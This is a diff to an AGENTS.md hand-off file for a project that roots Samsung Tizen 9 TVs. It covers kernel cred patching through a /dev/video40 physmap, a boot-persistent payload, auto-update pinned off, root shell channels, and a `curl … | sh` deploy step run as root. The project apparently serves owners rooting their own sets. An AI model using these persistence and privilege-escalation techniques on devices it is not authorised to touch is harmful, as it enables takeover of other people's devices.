@@ -1,4 +1,4 @@
-﻿# AGENTS.md — hand-off for the next agent or human
+# AGENTS.md — hand-off for the next agent or human
 
 You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
 then `docs/EXPLOIT.md` (how it works), `docs/USAGE.md` (running it),
@@ -35,8 +35,8 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | v17, 23,552 B, md5 `36d7c09f0f733cf5099b2fa591aebe5e` (`server/payload.dll`, source `payload/`; host-independent) |
-| Boot-to-root | ~40 s typical (v14: 53 s; v16: ~33 s). The slow path is real: v17 cold boot on 2026-10-25 used all 4 fast attempts, then long-retry `round=1` rooted — channel ~3.5 min after power-on. A slow boot is the fallback working, not a dead payload: read `share/root_boot.txt` (`attempt=`, `fast-exit`, `round=`) before assuming failure |
+| Payload | **v32 on the TV and in the repo** (`a4ccba98…`, 30,208 B), deployed 2026-10-25 |
+| Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v32 cold-boot check passed.** v32 cold boot 2026-10-25 18:25: attempt 1 failed as predicted (`parent=e37fb980` high, `cred=ffffffff`; round 3's child cred high → `cred-scan skip`), fast-exit t=55; **attempt 2 rooted at t=59** (`self=d9356780`, `cred=c5b78080`, both low). The v31 132 s regression is gone. The v31 cold boot had proved attempt 1 is an **allocation lottery**, not timing: attempts 1–3 failed (high reads), attempt 4 rooted at t=132 s. Whole-log evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
 | Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
@@ -57,10 +57,52 @@ reboot` from the payload once left the set in a standby the remote could not
 wake).
 
 The boot sequence is deliberate: the first launch after a cold boot usually cannot read
-task memory coherently, so the payload makes one short attempt, exits on purpose, and
-lets AUL relaunch it (~1–4 s). A fresh process re-maps the device and succeeds. Four
-fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a
-long in-process fallback takes over.
+task memory coherently. v29 kept the exit-on-purpose design but gave attempt 1 four
+rounds; v32's rounds are `{0,0,5000,5000}` (the v31 10 s last wait was reverted).
+**Attempt 1 is an allocation lottery** — if the first process's task/cred land in
+the unreliable high half (≥ `0xE0000000` for reads), no amount of in-process waiting
+helps; fast-exit and let AUL relaunch, because only a fresh process re-rolls the
+allocation. Four fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets
+at boot), then a long in-process fallback takes over.
+
+### Physmap window (v24–v27) — the read-staleness fix
+
+The first process after a boot (and the first processes after a `kill -9` restart)
+read stale bytes through the physmap while `getuid()` saw the live values: the
+kernel's dirty cache lines for pages it keeps touching (a running task's struct, the
+app's own cred) never write back, and a physmap mapping whose VA does not share the
+kernel's VIPT cache set (L1 way size — the alias period measured here is **32 KiB**)
+fetches stale RAM. `MapPage` now maps every page at **VA ≡ PA (mod 32 KiB)** out of a
+reserved `PROT_NONE` window (`ReserveWindow`/`MapPage`/`ReleasePage` in
+`payload/Program.cs`), so our cache line *is* the kernel's line and both directions
+are coherent. The alignment was stepped 8 KiB (v24) → 16 KiB (v25) → 32 KiB (v27):
+each step removed the next PA bit from per-slot parity — v25's 16 KiB slots left
+bit 14 to slot allocation order, which was the v25 attempt-4 "inti" stale-cred
+anomaly (see CHANGELOG). Slots are re-protected `PROT_NONE` instead of munmapped — a
+hole in the window could be grabbed by another `mmap` and later clobbered by a
+`MAP_FIXED`. If the window **reservation** fails, `MapPage` falls back to the plain
+mmap and beacons `physmap window unavailable`. A failed *fixed* mapping is different:
+Linux 5.4 has already unmapped that slot, so it is a hole. v30 restores it with
+`MAP_FIXED_NOREPLACE` (never clobbers a thief), beacons once
+(`physmap fixed map failed at … (hole restored), plain fallback`), and if the hole
+cannot be restored it switches the window off (`physmap window off: …`). `ReleasePage`
+does the same when a slot re-protect fails. One-time beacon per process:
+`physmap window at <va> slots=2048x8000`.
+
+**Second limit, found on the v31 cold boot:** the video40 physmap does not read the
+high half reliably even with an alias-correct window. Every coherent task/cred read
+in the log is `< 0xE0000000`; at/above it the reads are 0, junk or `0xFF` (0/21 high
+creds ever read 5001; 0/81 successful task pointers were high). That is why the
+first process after a cold boot has always failed attempt 1: its task/cred landed
+high. A fresh process re-rolls the allocation; waiting in-process does not. Do not
+add more rounds/waits for attempt 1.
+
+Diagnostic beacons (fifth pass, `docs/OPEN-ISSUES.md`): the `child=` line now carries
+`pu=` (the latched child's parent-cred uid), and while the direct-parent patch gate
+stays closed the payload beacons `direct-probe …` lines carrying the raw parent/cred
+pointers, the uid read, the same uid through a plain mmap (`plain=`) and the first 18
+bytes at the cred (`head=`) — that splits a stale cred *pointer* from stale cred
+*content*. Silent on success. Python twin: `direct_parent_patch` in `tools/sim_rpc.py`.
 
 Verified independently: two cold boots after a power-cycle (43 s and 47 s from
 power-on, no PC involvement) and one full run from a stock TV through the one-click
@@ -70,13 +112,14 @@ flow. The sequence of changes that got here is in `CHANGELOG.md`.
 browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
 `server/recover.sh` from that shell to reinstall the payload.
 
-Payload lineage (v5 → v17, and what each version fixed) is in `CHANGELOG.md`; the label
+Payload lineage (v5 → v23, and what each version fixed) is in `CHANGELOG.md`; the label
 regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
 
 ### Channel hardening (v14, extended in v15/v16)
 
 The app must still be able to prove root "with no PC", so nothing on the boot path
-may block on the network:
+may block on the network. v18 also prefixes every beacon with kernel uptime
+(`DSHROOT t=<n>s …`) so a slow boot is timed without the PC clock:
 
 - **31337 binds one address (v16).** The listener binds the TV's OWN address,
   derived at runtime from the route to the recorded PC (a UDP `connect` that sends
@@ -109,7 +152,7 @@ may block on the network:
 ### Auto-update is pinned off
 
 The TV would happily replace the app the payload lives in. The payload therefore
-re-asserts the menu setting at every boot (v13, unchanged in v17) and logs the readback
+re-asserts the menu setting at every boot (v13, unchanged through v23) and logs the readback
 (`DSHROOT autoupdate … = Int32: 0`):
 
 ```sh
@@ -210,7 +253,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
 | `tools/tv_ws_launch.py` | Samsung remote-control WebSocket diagnostic/launcher (refused on this unit) |
-| `payload/Program.cs` | boot payload source (v17) |
+| `payload/Program.cs` | boot payload source (v32; TV on v32) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -294,7 +337,7 @@ shell - that corrupts the stream and wastes the page load.
 
 `server/payload.dll` is committed **deliberately** — it is the artifact the TV
 fetches during deploy, and it is byte-identical to the build output
-`payload/out/MultiControlService.dll` (md5 `36d7c09f…`, v17; reproducible — see §9), so the repo runs
+`payload/out/MultiControlService.dll` (md5 `a4ccba98…`, v32; reproducible — see §9), so the repo runs
 without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
 Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
 
@@ -337,7 +380,7 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=23552, MD5=36d7c09f..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=30208, MD5=a4ccba98..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 #    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
@@ -356,9 +399,9 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `36d7c09f…`.
-- [ ] Cold boot with the browser closed → channel back within ~60–90 s, or up to ~4 min on the slow path (`root_boot.txt` shows 4 fast attempts + long-retry rounds, and it does root).
-- [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `a4ccba98…`
+- [ ] Cold boot with the browser closed → channel back by attempt 2 at ≤ ~55 s (v30 profile). Attempt-1 `SUCCESS` is a bonus; the fifth pass is closed with attempt 2 as the floor.
+- [ ] `kill -9 <app pid>` → channel back in ~15-45 s (attempt 1 may spend its four rounds; attempt 2 then roots), still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
       + clamps). Details per layer: `docs/TESTING.md`.
 
@@ -373,7 +416,9 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
    the child.
 5. **Kernel pointers can be above `0xE0000000`** (LPAE 1 GB direct map). Never
-   bound kernel pointers at `0xE0000000`.
+   bound the *pointer shape* at `0xE0000000`. But do not expect to **read** there:
+   the v31 cold boot showed 0/21 high creds coherent and 0/81 high task pointers;
+   a high task/cred needs a fresh process, not waiting (trap 16).
 6. **Post-fork managed code.** Use a pre-pinned buffer + raw
    `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
 7. **Short commands.** The stub's `cmdbuf` is 512 B and `run_root.py` /
@@ -399,6 +444,27 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
     return hides the live stub. `_find_tags_near_tail()` returns all of them;
     `tv_rootwatch.root_by_tail` only writes uid-5001 creds and reports `already`
     only when none exist. Keep both properties.
+14. **Physmap mappings alias kernel cache.** `MapPage` used to keep the VA, so
+    `PatchCred` readback could see uid 0 while `getuid()` stayed 5001 (the ARM
+    stub munmaps every op and never hits this). v18 `cacheflush`es every
+    `Write32`/`ReadPhys` and `DropPages()` after a successful patch. Do not
+    cache physmap pages across a `fork()` landmark. v25 extends this to the
+    READ direction (kernel wrote, physmap read stale): map at VA ≡ PA
+    (mod 32 KiB) — see "Physmap window" in §1.
+15. **Do not drop a new `PHYRFORK` whose parent cred reads uid 0 (or anything
+    else).** A stale word is usually physmap garbage, not init (v21 cold boot:
+    `seen=1 skip-orphan=1`); v23 latches *every* new `PHYRFORK` not in `pre`
+    and lets `PatchCred` refuse non-5001. Do not restore the v21 "skip a live
+    foreign uid" rule — a stale read can look foreign, and that skip is what
+    lost attempt 1. Kill leftover landmarks so a real init-reparented orphan is
+    in `pre` and never looked at.
+16. **High-half physmap reads are unreliable; attempt 1 is an allocation
+    lottery.** Every coherent task/cred read in the v30/v31 cold-boot logs was
+    `< 0xE0000000`; high creds read 0/junk (0/21 ever 5001), and the first
+    process after a cold boot always landed high. Only a fresh process re-rolls
+    the allocation. Do **not** "fix" attempt 1 with more rounds/waits — v31's
+    10 s last wait booted in 132 s vs v30's 51 s. The fifth pass is closed with
+    attempt 2 as the floor.
 
 ## 9. Rebuilding the payload
 
@@ -411,7 +477,10 @@ dotnet build -c Release -o out
 Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
 that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 
-- `Kptr(v) => v >= 0xC0000000` (accept the full 32-bit direct map).
+- `Kptr(v) => v >= 0xC0000000` for pointer shape (accept the full 32-bit direct
+  map, trap 5). Do **not** expect to read the high half reliably: v31 cold-boot
+  evidence is 0/21 high creds coherent, 0/81 high task pointers; a high
+  task/cred needs a fresh process, not more waiting.
 - Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
 - **Close `_fd` in the child with `syscall(6, _fd, …)`** before it sleeps, and
   keep the child free of CLR allocations.
@@ -420,6 +489,39 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 - Validate the cred (`SaneCred`: usage, ids, physical range) **and only write it when its uid is 5001** (`PatchCred` enforces this in v15).
 - Close `_fd` after rooting, before `RootChannel()`.
 - Keep the channel line protocol and the `__END__` terminator.
+- `cacheflush` after every physmap write (and before every read); `DropPages()`
+  after `fork()`, each hunt pass, and a successful `PatchCred`.
+- **The physmap window (v27, hardened in v30):** `MapPage` maps every page at
+  VA ≡ PA (mod 32 KiB) out of the reserved `PROT_NONE` window, and `ReleasePage`
+  re-protects slots instead of munmapping (a hole in the window could be grabbed
+  by another mmap and later clobbered by a `MAP_FIXED`). A failed fixed map is
+  itself a hole (Linux 5.4 unmaps the slot before the driver's mmap can fail):
+  v30 restores it with `MAP_FIXED_NOREPLACE` before the plain fallback, beacons
+  once, and turns the window off if the hole cannot be restored. `ReleasePage`
+  checks its re-protect and does the same. Keep the plain-mmap fallback and the
+  one-time `physmap window …` beacon.
+- **CredScanNear (v28, budget corrected in v30):** the content-scan fallback
+  patches sane uid-5001 creds near the child's cred (±1 MiB, lower addresses
+  first, child's own excluded, `getuid()` stop) while the child's cred page
+  reads 5001 — cred pages reading stale make it pointless. The 8-cred patch
+  budget is PROCESS-WIDE (`_scanPatched`), not per call; the scan runs only in
+  rounds that follow a wait, so early in-window scans cannot spend it before
+  the post-window round that can see ours. A pattern at page offset 0-3 is
+  skipped without aborting the rest of the page. Beacons: `cred-scan … total=`.
+- **Fast-mode rounds (v29→v32):** `{0, 0, 5000, 5000}` — the v31 10 s last wait
+  was reverted after its cold boot regressed (132 s). Attempt 1 is an allocation
+  lottery: high task/cred reads are garbage, so waiting cannot help; only a fresh
+  process re-rolls the address. The fast PHYSRPT scan is 2 tries; keep the
+  fast-exit as the final fallback.
+- `ReopenVideo()` after `FindBase` / `TaskOffsets` and **before** `fork()` (sole
+  opener). Never close `/dev/video40` while a landmark child still holds it.
+- Latch **every** new `PHYRFORK` not in `pre` (v23): parent-cred uid 5001, 0,
+  unreadable and live foreign all take the same `maybe` path. `PatchCred` still
+  writes uid 5001 only. Do not restore the v21/v22 "skip a live foreign uid"
+  rule — a stale word can look foreign, and that skip is what lost attempt 1.
+- `SIGKILL` landmark children before `Environment.Exit` and after a successful
+  root, before `RootChannel()`.
+- `Beacon()` keeps the `t=<uptime>s` prefix.
 - **Builds are reproducible since v17.** The csproj pins
   `IncludeSourceRevisionInInformationalVersion=false`; before that the SDK
   embedded the git SHA in `AssemblyInformationalVersion` (`1.0.0+<sha>`), so the
